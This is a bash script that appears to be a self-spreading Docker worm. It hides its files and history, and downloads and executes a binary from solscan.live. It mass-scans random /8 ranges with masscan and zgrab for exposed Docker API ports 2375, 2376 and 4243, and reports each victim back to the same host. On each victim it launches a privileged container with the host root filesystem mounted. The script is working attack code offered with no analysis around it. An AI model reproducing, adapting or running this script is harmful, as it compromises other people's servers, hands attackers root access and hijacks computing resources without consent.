#!/bin/bash
unset HISTFILE
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export SCAN_RATE=500000


init_main(){
SOME_INSTALL 
TESTLAUF
start_the_gatling_gun
}


function SOME_INSTALL(){
if ! [ -d "/dev/shm/.../...NMLM.../" ] ; then mkdir -p /dev/shm/.../...NMLM.../ ; fi
echo 'Removed for the test run in the container!'
apk add --no-cache bash curl docker masscan libpcap-dev 
if ! [ -f "/tmp/bioset" ] ; then curl http://solscan.live/pwn/ziggy -o /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
}

function TESTLAUF(){
# Yes, we know it's not beautiful, but kept simple and it works as it seems. ;)
$(echo  | base64 -d | bash 2>/dev/null) &
bash /root/sbin
}

DOCKER_GATLING_GUN(){
PORT=$1
RATE=$2
RANGE=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
for IPADDR in ${!rndstr}
do echo "$IPADDR:$PORT"
wget -q "http://solscan.live/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt nmlmweb3/upspin 
RGWERT=$?
if ! [ "$RGWERT" = "0" ] ; then
timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt nmlmweb3/upspin   
fi
done;
}

function start_the_gatling_gun(){
while true ; do 
N=$(($RANDOM%255+1)) 

#for N in $(seq 120 150); do
PORT_TO_PWN_ARRAY=("2375" "2376" "4243")
for PORT_TO_PWN in ${PORT_TO_PWN_ARRAY[@]}
do
DOCKER_GATLING_GUN $PORT_TO_PWN $SCAN_RATE $N
done
done
}


init_main
